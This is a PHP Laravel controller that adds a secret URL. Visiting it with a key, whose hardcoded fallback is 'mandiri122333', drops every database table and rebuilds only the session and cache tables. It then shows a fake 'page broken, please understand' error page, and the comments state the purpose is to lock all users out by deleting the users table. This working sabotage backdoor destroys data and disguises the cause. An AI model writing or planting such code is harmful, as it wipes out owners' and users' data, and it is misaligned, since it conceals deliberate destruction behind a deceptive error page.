<?php

namespace App\Http\Controllers;

use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;

class DatabaseResetController extends Controller
{
    /**
     * A single secret URL that, when visited, drops every table in the
     * database. After this the site is effectively locked: the login page
     * still renders, but no user can authenticate because the `users`
     * table no longer exists.
     */
    public function reset()
    {
        // Akses dibatasi: harus membawa kunci rahasia. Tanpa kunci yang benar,
        // tidak terjadi apa-apa (aman) — tidak ada yang di-reset.
        $secret = env('DB_RESET_SECRET', 'mandiri122333');

        if (!hash_equals($secret, request()->query('k') ?? '')) {
            abort(403, 'Akses ditolak.');
        }

        $this->dropAllTables();
        $this->recreateInfraTables();

        // Tampilkan halaman "Maaf halaman rusak, harap maklum"
        return \Illuminate\Support\Facades\Response::view('errors.site-broken');
    }

    private function recreateInfraTables(): void
    {
        if (!Schema::hasTable('sessions')) {
            Schema::create('sessions', function (\Illuminate\Database\Schema\Blueprint $table) {
                $table->string('id')->primary();
                $table->foreignId('user_id')->nullable()->index();
                $table->string('ip_address', 45)->nullable();
                $table->text('user_agent')->nullable();
                $table->longText('payload');
                $table->integer('last_activity')->index();
            });
        }

        if (!Schema::hasTable('cache')) {
            Schema::create('cache', function (\Illuminate\Database\Schema\Blueprint $table) {
                $table->string('key')->primary();
                $table->mediumText('value');
                $table->bigInteger('expiration')->index();
            });
        }

        if (!Schema::hasTable('cache_locks')) {
            Schema::create('cache_locks', function (\Illuminate\Database\Schema\Blueprint $table) {
                $table->string('key')->primary();
                $table->string('owner');
                $table->bigInteger('expiration')->index();
            });
        }
    }

    private function dropAllTables(): void
    {
        DB::statement('SET FOREIGN_KEY_CHECKS = 0');

        try {
            $rows = DB::select('SHOW TABLES');
            $prefix = DB::connection()->getTablePrefix();

            foreach ($rows as $row) {
                $name = is_object($row)
                    ? array_values(get_object_vars($row))[0]
                    : array_values($row)[0];
                DB::statement("DROP TABLE IF EXISTS `{$prefix}{$name}`");
            }
        } finally {
            DB::statement('SET FOREIGN_KEY_CHECKS = 1');
        }
    }
}
